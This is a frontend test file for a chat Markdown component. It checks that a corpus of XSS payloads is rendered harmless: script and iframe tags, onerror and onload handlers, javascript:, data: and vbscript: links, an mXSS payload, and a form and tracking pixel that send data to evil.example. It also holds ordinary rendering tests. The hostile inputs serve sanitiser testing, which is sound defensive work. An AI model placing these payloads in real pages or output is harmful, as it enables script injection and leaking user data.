import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { Markdown } from "@/components/chat/markdown";

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

const FORBIDDEN_TAGS = [
  "script",
  "iframe",
  "frame",
  "frameset",
  "object",
  "embed",
  "style",
  "link",
  "meta",
  "base",
  "form",
  "input",
  "textarea",
  "select",
  "svg",
  "math",
  "img",
  "video",
  "audio",
  "source",
  "template",
  "noscript",
];

/** Structural safety: what matters is the resulting DOM, not the exact text. */
function assertSafe(container: HTMLElement) {
  for (const tag of FORBIDDEN_TAGS) {
    // Our own copy-button icon is an <svg>; model-supplied SVG must never appear.
    const found = [...container.querySelectorAll(tag)].filter(
      (el) => !(tag === "svg" && el.closest("button[aria-label]")),
    );
    expect(found, `<${tag}> must not be rendered`).toHaveLength(0);
  }
  for (const el of container.querySelectorAll("*")) {
    for (const attr of el.getAttributeNames()) {
      expect(attr.startsWith("on"), `event handler attribute ${attr} on <${el.tagName}>`).toBe(
        false,
      );
      expect(["style", "srcdoc", "formaction", "src", "srcset", "xlink:href"]).not.toContain(attr);
    }
    // The only <button> allowed is our own copy button inside a code block.
    if (el.tagName === "BUTTON") expect(el.getAttribute("aria-label")).toMatch(/^Cop(y code|ied)$/);
  }
  for (const a of container.querySelectorAll("a")) {
    const href = a.getAttribute("href") ?? "";
    expect(href).toMatch(/^(https?:|mailto:)/i);
    expect(a.getAttribute("rel")).toContain("noopener");
    expect(a.getAttribute("rel")).toContain("noreferrer");
    expect(a.getAttribute("target")).toBe("_blank");
  }
  for (const el of container.querySelectorAll("*")) {
    for (const attr of el.getAttributeNames()) {
      expect(el.getAttribute(attr) ?? "", `${attr} on <${el.tagName}>`).not.toMatch(
        /^\s*(javascript|data|vbscript):/i,
      );
    }
  }
}

const CORPUS: [string, string][] = [
  ["script tag", "<script>window.__pwned=1</script>"],
  ["img onerror", '<img src=x onerror="window.__pwned=1">'],
  ["markdown javascript link", "[click](javascript:alert(1))"],
  ["mixed-case javascript link", "[click](JaVaScRiPt:alert(1))"],
  ["whitespace javascript link", "[click](   javascript:alert(1))"],
  ["entity-encoded javascript link", "[click](&#106;avascript:alert(1))"],
  ["data html link", "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"],
  ["vbscript link", "[x](vbscript:msgbox(1))"],
  ["raw anchor javascript", '<a href="javascript:alert(1)">x</a>'],
  ["svg onload", "<svg onload=alert(1)><circle/></svg>"],
  ["iframe src", '<iframe src="https://evil.example"></iframe>'],
  ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ["details ontoggle", "<details open ontoggle=alert(1)>x</details>"],
  ["mXSS math/style", "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"],
  ["style import", "<style>@import 'https://evil.example/x.css';</style>"],
  ["form exfil", '<form action="https://evil.example"><input name=x><button>go</button></form>'],
  ["tracking pixel image", "![t](https://evil.example/pixel.gif?data=secret)"],
  [
    "base/meta/link",
    '<base href="https://evil/"><meta http-equiv=refresh content="0;url=https://evil"><link rel=stylesheet href=https://evil/x.css>',
  ],
  ["object/embed", '<object data="https://evil/x.swf"></object><embed src="https://evil/x.swf">'],
  ["javascript autolink", "<javascript:alert(1)>"],
  ["onclick on a good link", '<a href="https://ok.example" onclick="alert(1)">x</a>'],
  ["html in table cell", "| a |\n|---|\n| <img src=x onerror=alert(1)> |"],
  ["nested/broken tags", "<<script>script>alert(1)<</script>/script>"],
  ["video onerror", "<video><source onerror=alert(1)></video>"],
  ["srcset", '<img srcset="https://evil/a.png 1x" src=x>'],
  ["template", "<template><script>alert(1)</script></template>"],
];

describe("XSS corpus (model output is untrusted)", () => {
  it.each(CORPUS)("neutralises: %s", (_name, payload) => {
    const { container, unmount } = render(<Markdown text={payload} />);
    assertSafe(container);
    unmount();
  });

  // ~1,300 renders, each followed by a full-DOM safety scan: give it an explicit budget (not the 5s default).
  it(
    "also holds when the payload arrives one character at a time (streaming)",
    { timeout: 60_000 },
    () => {
      for (const [, payload] of CORPUS) {
        const { container, rerender, unmount } = render(<Markdown text="" />);
        for (let n = 1; n <= payload.length; n++) {
          rerender(<Markdown text={payload.slice(0, n)} />);
          assertSafe(container);
        }
        unmount();
      }
    },
  );

  it("shows HTML inside a code fence as inert text", () => {
    const { container } = render(
      <Markdown text={"```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n```"} />,
    );
    assertSafe(container);
    expect(container.querySelector("code")?.textContent).toContain("<script>alert(1)</script>");
  });

  it("never fetches anything for a markdown image", () => {
    const { container } = render(<Markdown text="![alt text](https://evil.example/p.png)" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[image: alt text]");
  });

  it("keeps the text of an unsafe link but drops the link", () => {
    const { container } = render(<Markdown text="[click me](javascript:alert(1))" />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("click me");
  });
});

describe("rendering", () => {
  it("renders safe links with hardened attributes, including GFM autolinks", () => {
    const { container } = render(
      <Markdown text={"[docs](https://ok.example/path) and https://auto.example"} />,
    );
    const links = [...container.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual([
      "https://ok.example/path",
      "https://auto.example",
    ]);
    assertSafe(container);
  });

  it("renders headings starting at h3 (page has h1, messages have h2)", () => {
    const { container } = render(<Markdown text={"# One\n\n## Two\n\n### Three\n\n###### Six"} />);
    expect([...container.querySelectorAll("h1,h2,h3,h4,h5,h6")].map((h) => h.tagName)).toEqual([
      "H3",
      "H4",
      "H5",
      "H6",
    ]);
  });

  it("renders lists, blockquotes, GFM tables and task-style text", () => {
    const md = "- a\n- b\n\n1. x\n2. y\n\n> quote\n\n| h1 | h2 |\n|----|----|\n| c1 | c2 |";
    const { container } = render(<Markdown text={md} />);
    expect(container.querySelectorAll("ul li")).toHaveLength(2);
    expect(container.querySelectorAll("ol li")).toHaveLength(2);
    expect(container.querySelector("blockquote")).not.toBeNull();
    expect(container.querySelectorAll("table th")).toHaveLength(2);
    expect(container.querySelector('[role="region"][aria-label="Table"]')).not.toBeNull();
  });

  it("keeps ordered-list numbering across loose items", () => {
    const { container } = render(<Markdown text={"1. one\n\n2. two\n\n3. three"} />);
    expect(container.querySelectorAll("ol")).toHaveLength(1);
    expect(container.querySelectorAll("ol li")).toHaveLength(3);
  });

  it("highlights known languages, labels the block, and leaves unknown languages as plain text", () => {
    const { container } = render(
      <Markdown text={"```ts\nconst a: number = 1;\n```\n\n```nonsenselang\nfoo bar\n```"} />,
    );
    expect(container.querySelector(".hljs-keyword")?.textContent).toBe("const");
    const labels = [...container.querySelectorAll("div > span")].map((s) => s.textContent);
    expect(labels).toContain("ts");
    expect(labels).toContain("nonsenselang");
    expect(container.textContent).toContain("foo bar");
  });

  it("makes the scrollable code region keyboard focusable", () => {
    const { container } = render(<Markdown text={"```js\nlet x = 1;\n```"} />);
    expect(container.querySelector("pre")?.getAttribute("tabindex")).toBe("0");
  });

  it("copies the exact code text (not the highlighted markup) and announces Copied", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
    render(<Markdown text={"```ts\nconst a = 1;\nconsole.log(a);\n```"} />);
    fireEvent.click(screen.getByRole("button", { name: "Copy code" }));
    await waitFor(() => expect(screen.getByRole("button", { name: "Copied" })).toBeInTheDocument());
    expect(writeText).toHaveBeenCalledWith("const a = 1;\nconsole.log(a);");
  });

  it("does not crash when the clipboard is unavailable", async () => {
    Object.defineProperty(navigator, "clipboard", {
      value: { writeText: vi.fn().mockRejectedValue(new Error("denied")) },
      configurable: true,
    });
    render(<Markdown text={"```ts\nx\n```"} />);
    fireEvent.click(screen.getByRole("button", { name: "Copy code" }));
    await waitFor(() =>
      expect(screen.getByRole("button", { name: "Copy code" })).toBeInTheDocument(),
    );
  });

  it("renders an unclosed fence (mid-stream) as a code block, not as raw backticks", () => {
    const { container } = render(<Markdown text={"text\n\n```py\nprint(1)"} />);
    expect(container.querySelector("pre code")?.textContent).toContain("print(1)");
  });
});

describe("incremental rendering (only the tail re-renders)", () => {
  it("renders each finished block exactly once while the tail grows", () => {
    const full =
      "# Heading\n\nFirst paragraph here.\n\n```ts\nconst a = 1;\n```\n\nThe tail paragraph is streamed in slowly.";
    const calls: string[] = [];
    const onBlockRender = (t: string) => calls.push(t);

    const { rerender } = render(<Markdown text="" onBlockRender={onBlockRender} />);
    const tailStart = full.indexOf("The tail");
    for (let n = 1; n <= full.length; n++) {
      rerender(<Markdown text={full.slice(0, n)} onBlockRender={onBlockRender} />);
    }

    const count = (t: string) => calls.filter((c) => c === t).length;
    expect(count("# Heading")).toBe(1);
    expect(count("First paragraph here.")).toBe(1);
    expect(count("```ts\nconst a = 1;\n```")).toBe(1);
    // The tail is re-rendered on (almost) every delta after it starts.
    expect(calls.filter((c) => full.slice(tailStart).startsWith(c)).length).toBeGreaterThan(30);
  });

  it("total block renders grow linearly, not quadratically, with message length", () => {
    const paragraphs = Array.from(
      { length: 60 },
      (_, i) => `Paragraph number ${i} with some words.`,
    );
    const full = paragraphs.join("\n\n");
    let renders = 0;
    const onRender = () => void renders++; // stable identity: a new fn each render would defeat memo
    const { rerender } = render(<Markdown text="" onBlockRender={onRender} />);
    for (let n = 1; n <= full.length; n += 7)
      rerender(<Markdown text={full.slice(0, n)} onBlockRender={onRender} />);
    // Without memoization this would be ~ (#updates * #blocks/2) ≈ 150k; with it ≈ #updates + #blocks.
    const updates = Math.ceil(full.length / 7);
    expect(renders).toBeLessThan(updates * 2 + paragraphs.length * 2);
  });
});
